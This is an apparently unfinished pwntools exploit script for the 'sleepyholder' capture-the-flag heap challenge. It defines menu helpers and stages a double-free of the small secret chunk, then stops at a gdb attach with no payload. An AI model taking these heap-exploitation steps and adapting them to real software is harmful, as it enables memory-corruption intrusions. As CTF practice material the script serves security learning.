#!/usr/bin/env python3

from pwn import *

exe = ELF("./sleepyholder")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    def keep(level, secret):
    	r.sendline("1")
    	r.recvuntil("What secret do you want to keep?")

    	if level == "small":
    		r.sendline("1")
    	elif level == "big":
    		r.sendline("2")
    	elif level == "huge":
    		r.sendline("3")

    	r.recvuntil("Tell me your secret: ")
    	r.send(secret)

    def wipe(level):
    	r.sendline("2")
    	r.recvuntil("Which Secret do you want to wipe?")

    	if level == "small":
    		r.sendline("1")
    	elif level == "big":
    		r.sendline("2")

    def renew(level, secret):
    	r.sendline("3")
    	r.recvuntil("Which Secret do you want to renew?")

    	if level == "small":
    		r.sendline("1")
    	elif level == "big":
    		r.sendline("2")

    	r.recvuntil("Tell me your secret: ")
    	r.send(secret)


    keep("small", "A"*0x28)
    wipe("small")

    keep("big", "B"*0x28)
    wipe("small")

    #keep("small", "A"*0x28)

    gdb.attach(r)
    r.interactive()


if __name__ == "__main__":
    main()